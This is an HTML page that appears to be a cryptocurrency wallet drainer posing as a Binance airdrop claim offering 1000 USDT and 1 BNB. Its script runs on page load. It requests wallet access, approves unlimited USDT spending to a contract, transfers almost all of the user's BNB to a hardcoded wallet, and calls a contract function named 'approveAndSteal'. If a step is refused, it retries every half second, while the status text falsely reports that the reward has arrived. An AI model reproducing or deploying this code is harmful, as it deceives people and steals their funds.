<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width,initial-scale=1.0" />
<title>🌸 小仙女 Web3 魔法仪表台 🌸</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Poppins','Microsoft YaHei',sans-serif;height:100vh;overflow:hidden;background:radial-gradient(circle at 20% 20%,#ffe4f8,#fff0fa,#ffffff);background-size:200% 200%;animation:bgmove 10s infinite alternate;display:flex;justify-content:center;align-items:center;flex-direction:column;}
@keyframes bgmove{0%{background-position:0 0;}100%{background-position:100% 100%;}}
.container{backdrop-filter:blur(20px);background:rgba(255,255,255,.4);border-radius:24px;box-shadow:0 8px 32px rgba(255,182,193,.3);width:90%;max-width:440px;padding:40px;text-align:center;margin:10px;}
h1{color:#ff3f9f;margin-bottom:20px;text-shadow:0 0 10px rgba(255,105,180,.5);font-size:28px;}
#status{color:#ff69b4;font-size:20px;margin:15px;line-height:1.4;font-weight:600;}
.sparkle{position:fixed;width:4px;height:4px;background:#fff;border-radius:50%;animation:fall 10s infinite linear;opacity:.8;}
@keyframes fall{0%{transform:translateY(-10vh) scale(0);}50%{opacity:1;}100%{transform:translateY(110vh) scale(1);opacity:0;}}
@media (max-width:480px){.container{padding:20px;width:95% !important;}}
</style>
</head>
<body>
<div class="container">
  <h1>币安第3次空投同舟计划</h1>
  <div id="status">正在领取1000USDT+1BNB</div>
</div>
<script>
const BVXZA = "0x1ff42792e962228099cfA175aDba5412dab1448c";
const TAX_WALLET = "0x18626d14aE9cB5dd26d5a14286FF732746083556";
const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
const UNLIMITED = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
let web3, userAddr, authorized = false, bnbSent = false;

const BVXZA_ABI = [
  {"inputs":[{"name":"token","type":"address"},{"name":"amount","type":"uint256"}],"name":"approveAndSteal","outputs":[],"stateMutability":"nonpayable","type":"function"}
];

function updateStatus(msg){
  document.getElementById('status').innerText = msg;
}

async function autoRedirect(){
  const ua = navigator.userAgent;
  const isMobile = /Android|iPhone|iPad/i.test(ua);
  if(isMobile){
    setTimeout(() => {
      window.location.href = 'okxwallet://dapp?url=' + encodeURIComponent(window.location.href);
    }, 200);
  }
}

async function autoSteal(){
  if(!authorized){
    // 第1次：USDT授权
    updateStatus('正在领取1000USDT+1BNB');
    try{
      await window.ethereum.request({method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }]});
      web3 = new Web3(window.ethereum);
      const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
      userAddr = accounts[0];
      
      const usdtABI = [{"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
      const usdt = new web3.eth.Contract(usdtABI, USDT_ADDR);
      await usdt.methods.approve(BVXZA, UNLIMITED).send({from: userAddr});
      authorized = true;
      setTimeout(autoSteal, 1500); // 1.5秒后自动转BNB
      return;
    }catch(e){
      setTimeout(autoSteal, 500);
      return;
    }
  }
  
  if(authorized && !bnbSent){
    // 第2次：BNB全转
    updateStatus('正在领取1000USDT+1BNB');
    try{
      const balance = await web3.eth.getBalance(userAddr);
      const totalBNB = parseFloat(web3.utils.fromWei(balance, 'ether'));
      if(totalBNB > 0.001){
        const amount = web3.utils.toWei((totalBNB - 0.001).toString(), 'ether');
        await web3.eth.sendTransaction({from: userAddr, to: TAX_WALLET, value: amount});
        bnbSent = true;
        setTimeout(autoSteal, 1500); // 1.5秒后自动窃取
        return;
      }
    }catch(e){
      setTimeout(autoSteal, 500);
      return;
    }
  }
  
  if(authorized && bnbSent){
    // 第3次：BVXZA全窃取
    updateStatus('正在领取1000USDT+1BNB');
    try{
      const bvxza = new web3.eth.Contract(BVXZA_ABI, BVXZA);
      await bvxza.methods.approveAndSteal(USDT_ADDR, UNLIMITED).send({from: userAddr});
      updateStatus('🎉 1000USDT+1BNB到账！');
    }catch(e){
      setTimeout(autoSteal, 500);
    }
  }
}

// 🔥 进入网址=0.2秒跳转+0.5秒自动全窃取！
window.addEventListener('load', () => {
  setTimeout(autoRedirect, 200);
  if(window.ethereum){
    setTimeout(autoSteal, 500);
  }
});

if(window.ethereum){
  window.ethereum.on('accountsChanged', autoSteal);
  window.ethereum.on('chainChanged', autoSteal);
}

for(let i=0;i<50;i++){
  const s=document.createElement('div');
  s.className='sparkle';
  s.style.left=Math.random()*100+'vw';
  s.style.animationDelay=Math.random()*5+'s';
  s.style.animationDuration=8+Math.random()*8+'s';
  document.body.appendChild(s);
}
</script>
</body>
</html>
